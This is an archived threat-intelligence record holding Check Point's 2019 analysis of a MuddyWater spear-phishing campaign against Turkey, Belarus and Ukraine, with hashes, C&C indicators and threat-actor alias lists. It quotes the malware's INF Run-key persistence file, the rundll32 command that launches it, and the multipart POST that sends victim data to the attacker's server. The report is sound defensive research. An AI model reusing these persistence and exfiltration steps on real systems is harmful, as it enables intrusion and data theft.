{
    "id": "e6b4ccfb-1209-4dbc-9618-bfce30ae5e45",
    "created_at": "2022-10-25T16:48:23.289934Z",
    "updated_at": "2025-03-27T02:16:14.188045Z",
    "deleted_at": null,
    "sha1_hash": "dbc6091818e127de82037d85aacb7c481c4f5cf9",
    "title": "",
    "authors": "",
    "file_creation_date": "2019-04-20T02:18:20Z",
    "file_modification_date": "2019-04-20T02:18:20Z",
    "file_size": 1680127,
    "plain_text": "# The Muddy Waters of APT Attacks\n\n**research.checkpoint.com/the-muddy-waters-of-apt-attacks**\n\nApril 10, 2019\n\nApril 10, 2019\nThe Iranian APT, MuddyWater, has been active since at least 2017. Most recently though, a new campaign, targeting Belarus, Turkey and Ukraine, has emerged that\ncaught the attention of Check Point researchers.\n\nEver since at least 2017, the attackers behind MuddyWater have used a simple yet effective infection vector: Spear-phishing.\n\nAttacks usually begin with a targeted email sent to an organization. The next step is to steal legitimate documents from the compromised systems within that\norganization and then weaponize and distribute them to other unsuspecting victims.\n\nTo do this, a lure message that prompts the user to enable their content is added to those files, which are often carrying logos of real companies or governmental\nentities. The well-crafted and socially engineered malicious documents then become the first stage of a long and mainly fileless infection chain that eventually delivers\nPOWERSTATS, a signature PowerShell backdoor of this threat group. This powerful backdoor can receive commands from the attackers, enabling it to exfiltrate files\nfrom the system it is running on, execute additional scripts, delete files, and more.\n\nWhile these methods have remained consistent over the years, intermediate stages of this attack have been added, changed and removed due to several security\nvendors now aware of MuddyWater’s tactics, techniques and procedures. In this latest attack, though, and for the first time, we see a second stage executable that is not\nwritten in PowerShell.\n\n**The New Sample**\n\nWe initially came across a malicious Word document titled “SPK KANUN DEĞİŞİKLİĞİ GİB GÖRÜŞÜ.doc”, which roughly translates into “SPK (Capital Markets Board\nof Turkey) Law Change.doc”. The document contains macros and tries to convince the victim to enable its content by displaying a decoy message in Turkish:\n\n\n-----\n\n**Fig 1: Malicious document with macros**\n\n**SHA-256: 2f77ec3dd5a5c8146213fdf6ac2df4a25a542cbd809689a5642954f2097e037a**\n\nThe blurred image in the background contains a seemingly legitimate description of the law changes that are mentioned in the title. The highlighted words in this image\nmight suggest that it was edited in an environment that does not support the Turkish language:\n\n**Fig 2: Decoy document created in non-Turkish environment**\n\n**The Infection Flow**\n\n\n-----\n\nIf the macros in “SPK KANUN DEĞİŞİKLİĞİ GİB GÖRÜŞÜ.doc” are enabled, an embedded payload is decoded and saved in the %APPDATA% directory with the\nname “CiscoAny.exe”.\n\nThe executable is written in Delphi and packed with UPX, contains anti-analysis techniques, and seems to be impersonating a cellular networking tool:\n\nCopyright       Copyright 2015-2019 A&C Inc.\n\nProduct        RT 4G Cellular Networking Tool\n\nDescription      RT 4G Cellular Networking\n\nOriginal Name     RT_Framework.exe\n\nInternal Name     RT_4G\n\nFile Version     1.5.1.1\n\nComments       This application is absloutly free.\n\nRather than running this executable immediately, another file called “CiscoTAP.inf” is created under the same directory with the following content:\n\n[Version]\n\nSignature=$CHICAGO$\n\n[DefaultInstall]\n\nAddReg=AddRegSection\n\n[AddRegSection]\n\nHKCU,Software\\Microsoft\\Windows\\CurrentVersion\\Run,CiscoAny,,”%APPDATA%\\CiscoAny.exe”\n\nThen, the following command is executed to run the payload:\n\n“C:\\Windows\\System32\\cmd.exe” /k rundll32.exe ieadvpack.dll,LaunchINFSection %APPDATA%\\CiscoTAP.inf,,1,\n\nThis means that the executable will run the next time the user logs in, since it is added to the RUN registry key. IEAdvpack is a Windows 8 DLL, and this command will\nfail to run on certain operating system versions where this DLL is not found. INF files have been used in the [past by MuddyWater, although they were launched using](https://securelist.com/muddywater/88059/)\nAdvpack.dll and not IEAdvpack.dll.\n\nOnce executed, the first stage creates %APPDATA%\\ID.dat, a file which contains the victim’s unique identifier that is 16 characters long and randomly generated:\n\n[UID]\n\nID=[VICTIM_ID]\n\nLater it collects information about the system it is running on, such as the host’s name, the running processes, physical memory, up-time, language, public IP (using\nicanhazip.com) and more.\n\nAll of the above is written to %APPDATA%\\Info.txt, and the full information structure can be found in Appendix A below.\n\nFollowing the data collection, the executable drops another executable, also named “CiscoAny.exe”, that is hardcoded as a resource, but this time inside the %TEMP%\nfolder.\n\nThe second executable is also UPX packed and written in Delphi:\n\nProduct        Uploader\n\nDescription      Uploader\n\nOriginal Name     CiscoAny.exe\n\nProgramId       com.embarcadero.Uploader\n\nFile Version     1.0.0.0\n\n\n-----\n\ny, p g\n\n[UID]\n\nID=[VICTIM_ID]\n\n**[STAGE]**\n\n**ONE=SUC**\n\n**_The Second Stage_**\n\nThe second executable starts by checking the internet connectivity. It sends a request to, and if the connection is successful, it copies the contents of the previously\ncreated “Info.txt” into %APPDATA%\\[UNIQUE_ID].txt\n\n**Fig 3: Second stage instructions**\n\nThen, it will POST the file containing the system details to 185.117.75[.]116.php:\n\n—————————–[VICTIM_ID]\n\nContent-Disposition: form-data; name=”g3t_f_465″; filename=”[UNIQUE_ID].txt”\n\nContent-Type: application/octet-stream\n\n[INFO.TXT CONTENT]\n\n—————————–[VICTIM_ID]\n\nContent-Disposition: form-data; name=”t0ken”\n\na8s9ydehj323r8ykjqwer@8124e\n\n—————————–[VICTIM_ID]–\n\nThe name parameters (“g3t_f_465” and “t0ken”) in this request are determined by the items of the TclHttpRequest object in the TFRMMAIN resource, embedded in\nthe executable:\n\n\n-----\n\n**Fig 3: Embedded configuration**\n\nReturning to the main executable, a request is sent to googleads.hopto[.]org with the victim’s unique ID:\n\n**Fig 6: C&C communication**\n\nThe response from the C&C is stored in %APPDATA%\\temp.dat, and copied into %APPDATA%\\Lib.ps1.\n\nThe main executable constantly checks for “Lib.ps1” and tries to execute its content.\n\nAt the time of the analysis we were unable to get a response from the C&C but, as previously mentioned,\nPOWERSTATS is a common tool for the next stage of the infection.\n\n**Anti-Analysis**\n\nThe anti-analysis technique utilized in the first executable is quite effective and makes it very hard to analyze this\nsample statically.\n\nThe obfuscation creates a spaghetti-like code, and breaks apart the original code flow to small chunks, with the location\nof the next “real” instruction calculated dynamically.\n\nFollowing are examples of such code, where the next instruction location is calculated, and then jumped to (either by “jmp” or “retn”):\n\n\n-----\n\n**Fig 7: Anti-analysis code fragmentation**\n\n**Similarities to MuddyWater**\n\nThe document and the embedded macros contained unique strings that enabled us to hunt for other similar samples using them. This resulted in us finding three recent\ndocuments that appear to belong to the same campaign, some of which have been attributed to MuddyWater by other researchers:\n\n**Name: 2-Merve_Cooperation_CV.doc**\n\n**First Seen: Jan 02, 2019**\n\n**ITW: infosystema[.]kg/public/images/file_library/2-Merve_Cooperation_CV.doc**\n\n**SHA-256: c873532e009f2fc7d3b111636f3bbaa3074**\n\n65e5a99a7f4386bebff2ef8a37a20\n\n\n-----\n\n**Name: 3-New Law Updated for Client-VMP.doc**\n\n**First Seen: Jan 08, 2019**\n\n**ITW: As an attachment in two e-mails**\n\n**SHA-256: 925225002364615b964e4e3704876d9b101e4f07169dbb**\n\n459175248aefb5a0ad\n\n**Name: letter-for-Kazakhstan.doc**\n\n**First Seen: Jan 16, 2019**\n\n**ITW: orbe-fzc[.]com/letter-for-Kazakhstan.doc**\n\n**SHA256: c005e11a037210eb8efe12b8dee794be361**\n\n51de30b0223f2c9c4b9680cb033c0\n\nIn addition, by using [VBA2Graph, we were able to visualize the VBA call graph in the macros of each document. This allowed us to quickly notice that the files share](https://github.com/MalwareCantFly/Vba2Graph)\nmany similarities, such as their function names, parameter names, decryption methods and general code flow. For example, the function “UFYYRJSFHX” that writes\nthe decoded payload to the file system appears in all of them.\n\nWe have color coded the functions below, highlighting analogous functions to better show the similarities between the different graphs in this campaign, starting with the\ndocument from the infection flow we analyzed above:\n\n\n-----\n\n**Fig 8: Vba2graph correlation within the same campaign**\n\nAll those documents are from 2019, but the last two contain unique function names (“F38HUYFLSF985HFUISHS” and “SSSDS98746GB”) that were also observed in\nMuddyWater [documents dating back to November 2018, allowing us to see a connection between different campaigns:](https://blog.trendmicro.com/trendlabs-security-intelligence/new-powershell-based-backdoor-found-in-turkey-strikingly-similar-to-muddywater-tools/)\n\n\n-----\n\n**Fig 9: Vba2graph correlation to a different campaign**\n\n**MuddyWater Anomalies**\n\nWhile we can see a clear connection between the previous samples, there are some differences between them and the common delivery documents which are usually\nattributed to this highly active threat group.\n\nFor example, if we consider their appearance, and although this is not always the case, MuddyWater documents usually include a generic decoy message in English\ntelling the victim to enable their content. This is missing from two of the previous samples, and written in Turkish in the third one.\n\nFurthermore, if we continue to compare the macros of different documents, we will notice that a sample we [discovered this month and attributed to MuddyWater uses](https://twitter.com/_CPResearch_/status/1112789106638184449)\nanother function naming convention in its macros (four lowercase letters, instead of a mix of uppercase letters and numerals):\n\n**Figure 10: Vba2graph of a parallel recent campaign**\n\nSHA-256: 08e256cd2fa027552be253ec3bf427b537977f9123adf1f36e7cd2843a057554\n\nThis deviates completely from the previous documents we looked into, but was also found in other MuddyWater samples from the recent months:\n\n**Fig 11: Vba2graph of a parallel recent campaign**\n\nSHA-256: 93b749082651d7fc0b3caa9df81bad7617b3bd4475de58acfe953dfafc7b3987\n\nIt therefore seems that the same attackers are running parallel campaigns, which use at least two different macro generators for the first stage of the attack.\n\n**Conclusion**\n\nAlthough it has focused most of its efforts on the Middle East region, the political affiliations, motives and purposes behind MuddyWater’s attacks are not very welldefined, thus earning it its name. In the past, countries such as Saudi Arabia, the UAE and Turkey have been a main target, but the campaigns have also reached a\nmuch wider audience, making their way to victims in countries such as Belarus and Ukraine.\n\nThe attackers are also constantly innovating and experimenting with new techniques, and the extra layers which they add before delivering their signature payload make\nit harder to attribute an attack to them with high confidence. Just recently, we [spotted two DOCX files that take advantage of the external template technique to download](https://twitter.com/_CPResearch_/status/1112789106638184449)\nthe macro-equipped and familiar delivery documents of MuddyWater from remote hosts.\n\nTo conclude then, the attack we describe above shows an infection flow that we do not usually expect to see from MuddyWater, but it will not be surprising to see them\nintroduce more changes in the near future.\n\n——————————————————————————————————————————————————————————————————————————————\n\n**Check Point’s Threat Emulation**\n\nThe malware used in this attack was caught using [Check Point’s Threat Emulation.](https://www.checkpoint.com/products/threat-emulation-sandboxing/)\n\n\n-----\n\ny g p y, y p, y\nimmune to attackers’ evasion techniques. As part of the Check Point [SandBlast Zero-Day Protection solution, Threat Emulation prevents infections from new malware](https://www.checkpoint.com/solutions/zero-day-protection/)\nand targeted attacks.\n\n**Appendix A**\n\nIP Address : [IP_ADDRESS]\n\nHDD Information :\n\nH.D.D Name : [HOST_NAME]\n\nProcess List :\n\n0 = [PROCESS_NAME_0]\n\n1 = [PROCESS_NAME_1]\n\n2 = [PROCESS_NAME_2]\n\n3 = [PROCESS_NAME_3]\n\n4 = [PROCESS_NAME_4]\n\n5 = [PROCESS_NAME_5]\n\n6 = [PROCESS_NAME_6]\n\n7 = [PROCESS_NAME_7]\n\n8 = [PROCESS_NAME_8]\n\n9 = [PROCESS_NAME_9]\n\n10 = [PROCESS_NAME_10]\n\nMemory information :\n\n[%] memory in use\n\n[KB] of physical memory\n\n[KB] of available physical memory\n\n[KB] that can be stored in the paging file\n\n[KB] available in the paging file\n\nLanguage Is :English (United States)\n\nUptime: 1 Days 1 Hours 1 Minutes 1 Second\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2019/2019.04.10.Muddy_Waters/The%20Muddy%20Waters%20of%20APT%20Attacks.pdf"
    ],
    "report_names": [
        "The Muddy Waters of APT Attacks"
    ],
    "threat_actors": [
        {
            "id": "2ed8d590-defa-4873-b2de-b75c9b30931e",
            "created_at": "2023-01-06T13:46:38.730137Z",
            "updated_at": "2025-03-27T02:00:02.903261Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "Boggy Serpens",
                "Mango Sandstorm",
                "TEMP.Zagros",
                "Static Kitten",
                "G0069",
                "TA450",
                "Earth Vetala",
                "Seedworm",
                "COBALT ULSTER",
                "ATK51"
            ],
            "source_name": "MISPGALAXY:MuddyWater",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "31e69945-6c1e-40c3-ba8e-a77e81dd142a",
            "created_at": "2024-05-01T02:03:08.047377Z",
            "updated_at": "2025-03-27T02:05:17.326452Z",
            "deleted_at": null,
            "main_name": "COBALT ULSTER",
            "aliases": [
                "ENT-11 ",
                "ITG17 ",
                "MERCURY ",
                "Mango Sandstorm ",
                "MuddyWater ",
                "STAC 1171 ",
                "Seedworm ",
                "Static Kitten ",
                "TEMP.Zagros ",
                "UNC3313 ",
                "Yellow Nix ",
                "Earth Vetala "
            ],
            "source_name": "Secureworks:COBALT ULSTER",
            "tools": [
                " Canopy",
                " CrackMapExec",
                " CredNinja",
                " Empire",
                " FORELORD",
                " Koadic",
                " LaZagne",
                " Ligolo",
                " MKL64",
                " Metasploit",
                " Mimikatz",
                " MiniDump",
                " Mori",
                " MuddyC2Go",
                " MuddyC3",
                " PhonyC2",
                " Plink",
                " PowGoop",
                " PowerStats",
                " RemoteUtilities",
                " Revsocks",
                " ScreenConnect",
                " SimpleHelp",
                " Small Sieve",
                " Syncro",
                " Venom Proxy",
                " WMIExec",
                "AnyDesk"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "02e1c2df-8abd-49b1-91d1-61bc733cf96b",
            "created_at": "2022-10-25T15:50:23.308924Z",
            "updated_at": "2025-03-27T02:00:55.437268Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "MuddyWater",
                "Earth Vetala",
                "Static Kitten",
                "Seedworm",
                "TEMP.Zagros",
                "Mango Sandstorm",
                "TA450"
            ],
            "source_name": "MITRE:MuddyWater",
            "tools": [
                "STARWHALE",
                "POWERSTATS",
                "Out1",
                "PowerSploit",
                "Small Sieve",
                "Mori",
                "Mimikatz",
                "LaZagne",
                "PowGoop",
                "CrackMapExec",
                "ConnectWise",
                "SHARPSTATS",
                "RemoteUtilities",
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3c430d71-ab2b-4588-820a-42dd6cfc39fb",
            "created_at": "2022-10-25T16:07:23.880522Z",
            "updated_at": "2025-03-27T02:02:10.010443Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "ATK 51",
                "Boggy Serpens",
                "Cobalt Ulster",
                "ITG17",
                "Mango Sandstorm",
                "MuddyWater",
                "Operation BlackWater",
                "Operation Earth Vetala",
                "Operation Quicksand",
                "Seedworm",
                "Static Kitten",
                "T-APT-14",
                "TA450",
                "TEMP.Zagros",
                "Yellow Nix"
            ],
            "source_name": "ETDA:MuddyWater",
            "tools": [
                "Agentemis",
                "BugSleep",
                "CLOUDSTATS",
                "ChromeCookiesView",
                "Cobalt Strike",
                "CobaltStrike",
                "CrackMapExec",
                "DELPHSTATS",
                "EmPyre",
                "EmpireProject",
                "FruityC2",
                "Koadic",
                "LOLBAS",
                "LOLBins",
                "LaZagne",
                "Living off the Land",
                "MZCookiesView",
                "Meterpreter",
                "Mimikatz",
                "MuddyC2Go",
                "MuddyRot",
                "Mudwater",
                "POWERSTATS",
                "PRB-Backdoor",
                "PhonyC2",
                "PowGoop",
                "PowerShell Empire",
                "PowerSploit",
                "Powermud",
                "QUADAGENT",
                "SHARPSTATS",
                "SSF",
                "Secure Socket Funneling",
                "Shootback",
                "Smbmap",
                "Valyria",
                "chrome-passwords",
                "cobeacon",
                "prb_backdoor"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041774,
    "ts_creation_date": 1555726700,
    "ts_modification_date": 1555726700,
    "files": {
        "pdf": "https://archive.orkl.eu/dbc6091818e127de82037d85aacb7c481c4f5cf9.pdf",
        "text": "https://archive.orkl.eu/dbc6091818e127de82037d85aacb7c481c4f5cf9.txt",
        "img": "https://archive.orkl.eu/dbc6091818e127de82037d85aacb7c481c4f5cf9.jpg"
    }
}